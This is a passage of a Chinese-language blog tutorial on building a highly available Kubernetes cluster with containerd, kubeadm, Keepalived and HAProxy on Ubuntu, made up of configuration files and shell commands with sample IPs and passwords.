class="hljs-number">1</span><br>net.ipv6.<span class="hljs-keyword">conf</span>.<span class="hljs-keyword">all</span>.forwarding=<span class="hljs-number">1</span><br><span class="hljs-keyword">vm</span>.swappiness = <span class="hljs-number">0</span><br>EOF<br><br>sudo sysctl --<span class="hljs-built_in">system</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>无需过于关注此命令的细节，关键是要知道它确保 Kubernetes 集群中的容器网络得到正确管理，从而实现容器之间的安全、顺畅通信。</li></ol></blockquote><p>&#x3D;&#x3D;9.安装 ipset 及 ipvsadm&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装 ipset 及 ipvsadm</span><br><span class="hljs-built_in">sudo</span> apt-get install -y ipset ipvsadm<br><br><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/modules-load.d/ipvs.conf &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">ip_vs</span><br><span class="hljs-string">ip_vs_lc</span><br><span class="hljs-string">ip_vs_wlc</span><br><span class="hljs-string">ip_vs_rr</span><br><span class="hljs-string">ip_vs_wrr</span><br><span class="hljs-string">ip_vs_lblc</span><br><span class="hljs-string">ip_vs_lblcr</span><br><span class="hljs-string">ip_vs_dh</span><br><span class="hljs-string">ip_vs_sh</span><br><span class="hljs-string">ip_vs_fo</span><br><span class="hljs-string">ip_vs_nq</span><br><span class="hljs-string">ip_vs_sed</span><br><span class="hljs-string">ip_vs_ftp</span><br><span class="hljs-string">nf_conntrack</span><br><span class="hljs-string">ip_tables</span><br><span class="hljs-string">ip_set</span><br><span class="hljs-string">xt_set</span><br><span class="hljs-string">ipt_set</span><br><span class="hljs-string">ipt_rpfilter</span><br><span class="hljs-string">ipt_REJECT</span><br><span class="hljs-string">ipip</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-built_in">sudo</span> systemctl restart systemd-modules-load.service &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span>  systemd-modules-load.service<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;8.安装容器运行时（Containerd）&#x3D;&#x3D;<br>从 Kubernetes 1.28 开始，<code>dockershim</code> 已经被移除，因此 <code>kubeadm</code> 无法使用 Docker 作为容器运行时。如果你希望继续使用 Docker，你需要明确地安装并启用正确的容器运行时，或者切换到使用 <code>containerd</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 设置 Containerd 版本号环境变量</span><br>CONTAINERD_VERSION=1.7.22<br><br><br><span class="hljs-comment"># 2. 下载 Containerd 安装包（下载地址是经过代理的 GitHub 加速链接。）</span><br><span class="hljs-built_in">sudo</span> wget https://hub.openeeds.com/https://github.com/containerd/containerd/releases/download/v<span class="hljs-variable">$CONTAINERD_VERSION</span>/cri-containerd-cni-<span class="hljs-variable">$CONTAINERD_VERSION</span>-linux-amd64.tar.gz<br><br><br><span class="hljs-comment"># 3. 解压并安装 Containerd</span><br><span class="hljs-built_in">sudo</span> tar -zxvf cri-containerd-cni-<span class="hljs-variable">$CONTAINERD_VERSION</span>-linux-amd64.tar.gz -C /<br><br><br><span class="hljs-comment"># 4. 创建配置文件目录</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/containerd<br><br><br><span class="hljs-comment"># 5. 生成默认配置文件</span><br><span class="hljs-built_in">sudo</span> containerd config default | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/containerd/config.toml &gt; /dev/null<br><br><br><span class="hljs-comment"># 6. 修改默认配置参数</span><br><span class="hljs-comment"># 6.1. 启用 Systemd 管理 Cgroup</span><br>sed -i <span class="hljs-string">&#x27;/SystemdCgroup/s/=\(.*\)/= true/g&#x27;</span> /etc/containerd/config.toml <br><br><span class="hljs-comment"># 6.2. 将 Pause:3.8 替换成 Pause:3.9</span><br>sed -i <span class="hljs-string">&#x27;/sandbox_image/s/=\(.*\)/= &quot;registry.aliyuncs.com\/google_containers\/pause:3.9&quot;/g&#x27;</span> /etc/containerd/config.toml <br><br><br><span class="hljs-comment"># 6.3. 手动修改镜像加速地址（DockerHub 源）</span><br><span class="hljs-built_in">sudo</span> vim /etc/containerd/config.toml <br><br>[plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.mirrors]<br>  [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.mirrors.<span class="hljs-string">&quot;docker.io&quot;</span>]<br>    endpoint = [<span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>]<br><br><br><span class="hljs-comment"># 6.4. 配置 Containerd 代理</span><br>..........                            <span class="hljs-comment"># 遵纪守法，这里不展示</span><br><br><br><span class="hljs-comment"># 6.5. 重启并开机启动 containerd</span><br><span class="hljs-built_in">sudo</span> systemctl restart containerd &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> containerd<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AK8s/image-20250402174618934.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果镜像的源 不是 <code>docker.io</code>，那么你在 <code>containerd</code> 里配置的 <code>docker.io</code> 加速镜像是 <strong>无效</strong> 的。</li></ol></blockquote><p>&#x3D;&#x3D;9.配置 crictl 客户端&#x3D;&#x3D;<br><code>crictl</code> 是 Kubernetes 官方提供的命令行工具，用于直接操作容器运行时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 编辑配置文件</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;runtime-endpoint: unix:///run/containerd/containerd.sock\nimage-endpoint: unix:///run/containerd/containerd.sock\ntimeout: 10\ndebug: false&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/crictl.yaml<br><br><br><span class="hljs-comment"># 2. 重启 containerd 服务</span><br><span class="hljs-built_in">sudo</span> systemctl daemon-reload &amp;&amp; systemctl restart containerd &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> containerd<br><br><br><span class="hljs-comment"># 3. 测试 containerd 是否正常工作</span><br><span class="hljs-built_in">sudo</span> crictl images<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;9.安装 kubeadm 等组件&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 导入 Kubernetes GPG 公钥（用于软件包签名验证）</span><br><span class="hljs-attribute">curl</span> -s https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  | sudo apt-key add -<br><br><br><span class="hljs-comment"># 2. 添加 Kubernetes 阿里云镜像源</span><br><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;deb https://mirrors.aliyun.com/kubernetes/apt/  kubernetes-xenial main&quot;</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  | sudo tee /etc/apt/sources.list.d/kubernetes.list<br><br><br><span class="hljs-comment"># 3. 更新源并安装指定版本组件</span><br><span class="hljs-attribute">sudo</span> apt-get update &amp;&amp; sudo apt-get install -y <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  kubeadm=<span class="hljs-number">1</span>.<span class="hljs-number">28</span>.<span class="hljs-number">2</span>-<span class="hljs-number">00</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  kubelet=<span class="hljs-number">1</span>.<span class="hljs-number">28</span>.<span class="hljs-number">2</span>-<span class="hljs-number">00</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  kubectl=<span class="hljs-number">1</span>.<span class="hljs-number">28</span>.<span class="hljs-number">2</span>-<span class="hljs-number">00</span><br><br><br><span class="hljs-comment"># 4. 锁定版本，防止系统自动升级</span><br><span class="hljs-attribute">sudo</span> apt-mark hold kubelet kubeadm kubectl<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;10.配置kubelet&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 配置 kubelet 的 cgroup 驱动为 `systemd`</span><br><span class="hljs-built_in">cat</span> &gt; /etc/default/kubelet &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">KUBELET_EXTRA_ARGS=&quot;--cgroup-driver=systemd&quot;</span><br><span class="hljs-string">EOF</span><br><br><br><span class="hljs-comment"># 2. 重启并开机启动 containerd</span><br><span class="hljs-built_in">sudo</span> systemctl restart containerd &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> containerd<br></code></pre></td></tr></table></figure><hr><h4 id="1-4-Keepalived-节点环境准备"><a href="#1-4-Keepalived-节点环境准备" class="headerlink" title="1.4. Keepalived 节点环境准备"></a>1.4. Keepalived 节点环境准备</h4><p>Keepalived 节点无需任何准备，进行完 Ubuntu 初始化即可，但是 Keepalived 绑定 VIP 的服务器（Haproxy），必须进行下面的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install -y conntrack libseccomp2<br></code></pre></td></tr></table></figure><hr><h4 id="1-5-Haproxy-节点环境准备"><a href="#1-5-Haproxy-节点环境准备" class="headerlink" title="1.5. Haproxy 节点环境准备"></a>1.5. Haproxy 节点环境准备</h4><p>Haproxy 节点无需任何准备，进行完 Ubuntu 初始化即可</p><hr><h3 id="2-部署-Keepalived-集群"><a href="#2-部署-Keepalived-集群" class="headerlink" title="2. 部署 Keepalived 集群"></a>2. 部署 Keepalived 集群</h3><p>&#x3D;&#x3D;1.安装 Keepalived&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install -y keepalived<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.编辑配置文件&#x3D;&#x3D;</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"># <span class="hljs-number">1.</span> 编辑 Keepalived 配置文件<br>sudo vim /etc/keepalived/keepalived.conf<br><br><br># <span class="hljs-number">2.</span> 添加以下内容<br>vrrp_script chk_haproxy1 &#123;<br>    script <span class="hljs-string">&quot;/bin/bash -c &#x27;echo &gt; /dev/tcp/192.168.136.14/16443&#x27;&quot;</span><br>    <span class="hljs-built_in">int</span>erval <span class="hljs-number">2</span><br>    weight <span class="hljs-number">-2</span><br>&#125;<br><br>vrrp_script chk_haproxy2 &#123;<br>    script <span class="hljs-string">&quot;/bin/bash -c &#x27;echo &gt; /dev/tcp/192.168.136.15/16443&#x27;&quot;</span><br>    <span class="hljs-built_in">int</span>erval <span class="hljs-number">2</span><br>    weight <span class="hljs-number">-2</span><br>&#125;<br><br>vrrp_instance VI_1 &#123;<br>    state MASTER                               # 主就写 Master，从就写 BACKUP<br>    <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ens33</span><br>    <span class="hljs-symbol">virtual_router_id</span> <span class="hljs-symbol">51</span><br>    <span class="hljs-symbol">priority</span> <span class="hljs-symbol">100</span>                               # 主就写 <span class="hljs-symbol">100</span>，从就稍微低点 <span class="hljs-symbol">90</span><br>    <span class="hljs-symbol">advert_int</span> <span class="hljs-symbol">1</span><br><br>    <span class="hljs-symbol">authentication</span> &#123;<br>        auth_type PASS<br>        auth_pass wq666666<br>    &#125;<br><br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.100</span>/<span class="hljs-number">24</span><br>    &#125;<br><br>    track_script &#123;<br>        chk_haproxy1<br>        chk_haproxy2<br>    &#125;<br>&#125;<br><br><br># <span class="hljs-number">3.</span> 重启和开机自启动 Keepalived<br>sudo systemctl start keepalived &amp;&amp; sudo systemctl enable keepalived<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Keepalived 状态&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl status keepalived<br></code></pre></td></tr></table></figure><hr><h3 id="3-部署-Haproxy-集群"><a href="#3-部署-Haproxy-集群" class="headerlink" title="3. 部署 Haproxy 集群"></a>3. 部署 Haproxy 集群</h3><p>&#x3D;&#x3D;1.安装 Haproxy&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install -y haproxy<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.配置配置文件&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 编辑 Haproxy 配置文件</span><br><span class="hljs-attribute">sudo</span> vim /etc/haproxy/haproxy.cfg<br><br><br><span class="hljs-comment"># 2. 写入以下内容（）</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># Global settings</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">global</span><br>    <span class="hljs-comment"># 日志配置（需配置 rsyslog 接收 local2）</span><br>    <span class="hljs-attribute">log</span>         <span class="hljs-number">127.0.0.1</span> local2<br>    <span class="hljs-attribute">chroot</span>      /var/lib/haproxy<br>    <span class="hljs-attribute">pidfile</span>     /var/run/haproxy.pid<br>    <span class="hljs-attribute">maxconn</span>     <span class="hljs-number">4000</span><br>    <span class="hljs-attribute">user</span>        haproxy<br>    <span class="hljs-attribute">group</span>       haproxy<br>    <span class="hljs-attribute">daemon</span><br><br>    <span class="hljs-comment"># 开启本地统计 socket（供监控工具使用）</span><br>    <span class="hljs-attribute">stats</span> socket /var/lib/haproxy/stats<br><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># 默认配置</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">defaults</span><br>    <span class="hljs-attribute">mode</span>                    http<br>    <span class="hljs-attribute">log</span>                     global<br>    <span class="hljs-attribute">option</span>                  httplog<br>    <span class="hljs-attribute">option</span>                  dontlognull<br>    <span class="hljs-attribute">option</span>                  http-server-close<br>    <span class="hljs-attribute">option</span>                  redispatch<br>    <span class="hljs-attribute">retries</span>                 <span class="hljs-number">3</span><br>    <span class="hljs-attribute">timeout</span> http-request    <span class="hljs-number">10</span>s<br>    <span class="hljs-attribute">timeout</span> queue           <span class="hljs-number">1</span>m<br>    <span class="hljs-attribute">timeout</span> connect         <span class="hljs-number">10</span>s<br>    <span class="hljs-attribute">timeout</span> client          <span class="hljs-number">1</span>m<br>    <span class="hljs-attribute">timeout</span> server          <span class="hljs-number">1</span>m<br>    <span class="hljs-attribute">timeout</span> http-keep-alive <span class="hljs-number">10</span>s<br>    <span class="hljs-attribute">timeout</span> check           <span class="hljs-number">10</span>s<br>    <span class="hljs-attribute">maxconn</span>                 <span class="hljs-number">3000</span><br><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># Kubernetes apiserver 前端配置，监听端口为 16443</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">frontend</span> kubernetes-apiserver<br>    <span class="hljs-attribute">mode</span>            tcp<br>    <span class="hljs-attribute">bind</span>            *:<span class="hljs-number">16443</span><br>    <span class="hljs-attribute">option</span>          tcplog<br>    <span class="hljs-attribute">default_backend</span> kubernetes-apiserver<br><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># Kubernetes apiserver 后端配置，使用轮询策略</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">backend</span> kubernetes-apiserver<br>    <span class="hljs-attribute">mode</span>    tcp<br>    <span class="hljs-attribute">balance</span> roundrobin<br>    <span class="hljs-attribute">server</span>  master01.k8s.io <span class="hljs-number">192.168.136.8:6443</span> check inter <span class="hljs-number">2</span>s fall <span class="hljs-number">3</span> rise <span class="hljs-number">2</span><br>    <span class="hljs-attribute">server</span>  master02.k8s.io <span class="hljs-number">192.168.136.9:6443</span> check inter <span class="hljs-number">2</span>s fall <span class="hljs-number">3</span> rise <span class="hljs-number">2</span><br><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-comment"># HAProxy 状态页面</span><br><span class="hljs-comment">#---------------------------------------------------------------------</span><br><span class="hljs-attribute">listen</span> stats<br>    <span class="hljs-attribute">bind</span>            *:<span class="hljs-number">1080</span><br>    <span class="hljs-attribute">stats</span> uri       /admin?stats<br>    <span class="hljs-attribute">stats</span> realm     HAProxy\\ Statistics<br>    <span class="hljs-attribute">stats</span> auth      admin:awesomePassword<br>    <span class="hljs-attribute">stats</span> refresh   <span class="hljs-number">5</span>s<br><span class="hljs-comment"># 这里需要补一个换行符，按一下 Enter 键 即可</span><br><br><br><br><span class="hljs-comment"># 3. 检查配置文件是否有语法错误</span><br><span class="hljs-attribute">haproxy</span> -c -f /etc/haproxy/haproxy.cfg<br><br><br><span class="hljs-comment"># 4. 重启和开机自启动 Haproxy</span><br><span class="hljs-attribute">sudo</span> systemctl start haproxy &amp;&amp; sudo systemctl enable haproxy<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Haproxy 状态&#x3D;&#x3D;</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 1. 检查 Haproxy 状态</span><br>sudo systemctl status haproxy<br><br><br><span class="hljs-meta"># 2. 检查 Haproxy 监听的端口</span><br>netstat <span class="hljs-punctuation">-</span>lntup <span class="hljs-string">| grep haproxy</span><br><br><br><span class="hljs-meta"># 3. 访问 Haproxy 状态页面</span><br>http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.136.14:1080/admin?stats</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-检查-VIP-是否正确绑定"><a href="#4-检查-VIP-是否正确绑定" class="headerlink" title="4. 检查 VIP 是否正确绑定"></a>4. 检查 VIP 是否正确绑定</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ip</span> <span class="hljs-keyword">addr</span> show<br></code></pre></td></tr></table></figure><hr><h3 id="5-部署第一个-Master-节点"><a href="#5-部署第一个-Master-节点" class="headerlink" title="5. 部署第一个 Master 节点"></a>5. 部署第一个 Master 节点</h3><p>&#x3D;&#x3D;1.初始化控制平面&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 创建存放 K8S 配置的目录</span><br>sudo mkdir <span class="hljs-symbol">/usr/local/kubernetes/manifests</span> <span class="hljs-operator">-</span>p<br><br><br><span class="hljs-comment"># 2. 切换到刚刚创建的目录</span><br>cd <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>local<span class="hljs-operator">/</span>kubernetes<span class="hljs-operator">/</span>manifests<span class="hljs-symbol">/</span><br><br><br><span class="hljs-comment"># 3. 查看 kubeadm 初始化时默认会用到哪些镜像</span><br>kubeadm config images list <span class="hljs-operator">-</span>-image-repository<span class="hljs-operator">=</span>registry.aliyuncs.com<span class="hljs-symbol">/google_containers</span><br><br><br><span class="hljs-comment"># 4. 获取当前 kubelet 的版本号</span><br>K<span class="hljs-attr">UBE_VERSION</span><span class="hljs-operator">=</span>$(kubelet <span class="hljs-operator">-</span>-version | awk &#x27;&#123;print $<span class="hljs-number">2</span>&#125;&#x27;)<br><br><br><span class="hljs-comment"># 5. 使用 crictl 工具批量拉取所有所需镜像</span><br>kubeadm config images list \<br>  <span class="hljs-operator">-</span>-image-repository<span class="hljs-operator">=</span>registry.aliyuncs.com<span class="hljs-symbol">/google_containers</span> \<br>  <span class="hljs-operator">-</span>-kubernetes-version<span class="hljs-operator">=</span>$KUBE_VERSION | xargs <span class="hljs-operator">-</span>n <span class="hljs-number">1</span> crictl pull<br><br><br><span class="hljs-comment"># 6. 查看已拉取的镜像，确认是否成功</span><br>sudo crictl images<br><br><br><span class="hljs-comment"># 7. 获取初始化默认配置中的 apiVersion，用于写入配置文件</span><br>A<span class="hljs-attr">PI_VERSION</span><span class="hljs-operator">=</span>$(kubeadm config print init-defaults | grep <span class="hljs-params">apiVersion:</span> | awk &#x27;NR<span class="hljs-operator">==</span><span class="hljs-number">1</span>&#x27;)<br><br><br><span class="hljs-comment"># 8. 再次获取 kubelet 的版本号，用于指定 Kubernetes 版本</span><br>K<span class="hljs-attr">UBE_VERSION</span><span class="hljs-operator">=</span>$(kubelet <span class="hljs-operator">-</span>-version | awk &#x27;&#123;print $<span class="hljs-number">2</span>&#125;&#x27;)<br><br><br><span class="hljs-comment"># 9. 创建 kubeadm 初始化所需的配置文件（kubeadm-config.yaml）</span><br>cat <span class="hljs-operator">&gt;</span> kubeadm-config.yaml <span class="hljs-operator">&lt;</span><span class="hljs-operator">&lt;</span>EOF<br>$API_VERSION<br><span class="hljs-params">kind:</span> ClusterConfiguration<br><span class="hljs-params">kubernetesVersion:</span> $KUBE_VERSION<br><span class="hljs-params">controlPlaneEndpoint:</span> <span class="hljs-string">&quot;192.168.136.100:6443&quot;</span><br><span class="hljs-params">imageRepository:</span> registry.aliyuncs.com<span class="hljs-symbol">/google_containers</span><br><span class="hljs-params">apiServer:</span><br>  <span class="hljs-params">certSANs:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-string">&quot;k8s-vip&quot;</span><br>  <span class="hljs-operator">-</span> <span class="hljs-string">&quot;192.168.136.100&quot;</span><br>  <span class="hljs-operator">-</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>  <span class="hljs-operator">-</span> <span class="hljs-string">&quot;::1&quot;</span><br><span class="hljs-params">networking:</span><br>  <span class="hljs-params">dnsDomain:</span> cluster.local<br>  <span class="hljs-params">serviceSubnet:</span> <span class="hljs-number">10.96</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">/12</span><br>  <span class="hljs-params">podSubnet:</span> <span class="hljs-number">10.244</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">/16</span><br><span class="hljs-operator">-</span>--<br><span class="hljs-params">apiVersion:</span> kubeproxy.config.k8s.io<span class="hljs-symbol">/v1alpha1</span><br><span class="hljs-params">kind:</span> KubeProxyConfiguration<br><span class="hljs-params">mode:</span> ipvs<br>EOF<br><br><br><span class="hljs-comment"># 10. 使用指定的配置文件进行 Kubernetes 集群初始化</span><br>kubeadm init <span class="hljs-operator">-</span>-config 